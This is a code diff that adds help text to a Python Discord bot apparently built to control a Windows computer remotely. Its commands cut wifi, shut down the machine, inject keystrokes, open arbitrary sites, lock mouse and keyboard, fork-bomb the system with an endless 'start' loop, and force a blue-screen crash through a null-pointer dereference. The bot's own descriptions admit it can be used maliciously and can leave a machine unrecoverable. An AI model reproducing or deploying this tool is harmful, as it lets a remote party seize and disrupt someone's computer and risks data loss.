@@ -69,21 +69,22 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='hello',
-        brief='',
-        description=''
+        brief='Check if Bot is online',
+        description='Nothing interesting... Just to check if bot\'s library is correctly loaded'
     )
-    async def hello(self, ctx, *, member: discord.Member = None):
+    async def hello(self, ctx):
         """Says hello"""
-        member = member or ctx.author
-        await ctx.send(f'Welcome summoner,  {member.name}~ Hehehe :)')
+        await ctx.send(f'Welcome summoner,  {ctx.author.name}~ Hehehe :)')
 
 
     @commands.command(
         name='off_wifi',
-        brief='',
-        description=''
+        brief='Disable wifi',
+        description='Disables wifi for x seconds (passed as parameter). It\'s not a garantee that it will reconnect automatically after.'
     )
-    async def off_wifi(self, ctx, time_sec:int = 1):
+    async def off_wifi(self, ctx,
+        time_sec:int = commands.parameter(default=1, description='Time in seconds')
+    ):
         for i in range(time_sec):
             os.system('netsh wlan disconnect')
             await time.sleep(1)
@@ -91,10 +92,12 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='shutdown',
-        brief='',
-        description=''
+        brief='Shutdown computer',
+        description='Shutdown computer. If time (seconds) is passed than it will pop up a warning message and do a countdown otherwise it will instantaneously shutdown. To cancel count-down pass time as -1.'
     )
-    async def shutdown(self, ctx, time_sec:int = 0):
+    async def shutdown(self, ctx,
+        time_sec:int = commands.parameter(default=0, description='Time in seconds')
+    ):
         if time_sec == -1:
             os.system(f'shutdown /a')
         else:
@@ -103,10 +106,12 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='type',
-        brief='',
-        description=''
+        brief='(!) Warning. Type letters (keys and hotkeys) and combine them',
+        description='(!) Warning: Low probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(Key.__members__.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
     )
-    async def type(self, ctx, *, cmds_line):
+    async def type(self, ctx,
+        *, cmds_line = commands.parameter(description='Instructions')
+    ):
         c = Controller()
         special_keys = Key.__members__
 
@@ -171,31 +176,38 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='site',
-        brief='',
-        description=''
+        brief='Opens any website',
+        description='Opens the website passed as a parameter'
     )
-    async def site(self, ctx, url):
+    async def site(self, ctx,
+        url = commands.parameter(description='Webiste\'s URL')
+    ):
         webbrowser.open(url, new=1)
 
 
     @commands.command(
         name='beep',
-        brief='Frequency must be in 37 thru 32767',
-        description=''
+        brief='Emits a beep sound',
+        description='Emits a beep sound for x seconds and with an y frequency (passed as parameters by respective order if you want to modify). Frequency must be in 37 thru 32767'
     )
-    async def beep(self, ctx, time_sec:int=1, freq:int=2500):
+    async def beep(self, ctx,
+        time_sec:int=commands.parameter(default=1, description='Time in seconds'),
+        freq:int=commands.parameter(default=2500, description='Frequency')
+    ):
         time_sec *= 1000
         winsound.Beep(freq, time_sec)
 
 
     @commands.command(
         name='play_sound',
-        brief='Only accepts WAV file',
-        description=''
+        brief='Plays a sound',
+        description='Plays a sound in a file uploaded along with the command. Only accepts WAV file. If the word \'loop\' is present in the command then it plays indefinitely'
     )
-    async def play_sound(self, ctx, loop:bool=False):
+    async def play_sound(self, ctx,
+        loop:str=commands.parameter(default='', description='Loop flag')
+    ):
         flags = winsound.SND_ASYNC | winsound.SND_ALIAS
-        if loop:
+        if loop.lower() == 'loop':
             flags |= winsound.SND_LOOP
 
         # Avoid conflicts: Stop before replacing temporary file
@@ -215,10 +227,10 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='stop_sound',
-        brief='',
-        description=''
+        brief='Stops the sound',
+        description='Stops the sound'
     )
-    async def stop_sound(self, ctx, loop:bool=False):
+    async def stop_sound(self, ctx):
         if self.tmp_sound:
             winsound.PlaySound(None, winsound.SND_ASYNC)
             os.unlink(self.tmp_sound)
@@ -227,8 +239,8 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='lock_input',
-        brief='',
-        description=''
+        brief='Locks input (Mouse and Keyboard)',
+        description='Won\'t be able to use mouse and keyboard until unlock. Be aware that wifi off after lock input can result in a impossible unlock if computer doesn\'t reconnect automatically to the wifi.'
     )
     async def lock_input(self, ctx):
         # Disable mouse and keyboard events
@@ -245,8 +257,8 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='unlock_input',
-        brief='',
-        description=''
+        brief='Unlocks input (Mouse and Keyboard)',
+        description='Unlocks input (Mouse and Keyboard)'
     )
     async def unlock_input(self, ctx):
         # Enable mouse and keyboard events
@@ -261,18 +273,20 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='set_volume',
-        brief='',
-        description=''
+        brief='Sets computer\'s volume from 0 to 100',
+        description='Sets computer\'s volume from 0 to 100'
     )
-    async def set_volume(self, ctx, value:int):
+    async def set_volume(self, ctx,
+        value:int=commands.parameter(description='Volume')
+    ):
         percentage = min(max(value, 0), 100) / 100
         self.volume.SetMasterVolumeLevelScalar(percentage, None)
 
 
     @commands.command(
         name='image',
-        brief='',
-        description=''
+        brief='Opens an image',
+        description='Upload an image along with the command and it will be opened on the other side'
     )
     async def image(self, ctx):
         if ctx.message.attachments:
@@ -282,10 +296,13 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='bomb',
-        brief='',
-        description=''
+        brief='(!) Warning. Makes computer slow for a moment',
+        description='(!) Warning: Can crash computer. Makes computer slower by level and time (seconds). Level corresponds to the number of tabs it will open on background (more = slower) and time corresponds to the time which this will execute (higher level will require more time)'
     )
-    async def bomb(self, ctx, level:int=1, time_sec:int=10):
+    async def bomb(self, ctx,
+        level:int=commands.parameter(default=1, description='Level'),
+        time_sec:int=commands.parameter(default=10, description='Time')
+    ):
         cmd = 'for /l %a in (0,0,0) do start /MIN'
         
         procs = [Popen(cmd, stdout=PIPE, shell=True) for _ in range(level)]
@@ -299,8 +316,8 @@ class Lib(commands.Cog):
 
     @commands.command(
         name='crash',
-        brief='',
-        description=''
+        brief='Crash computer',
+        description='Crashes computer with a blue screen of death.'
     )
     async def crash(self, ctx):
         nullptr = POINTER(c_int)()
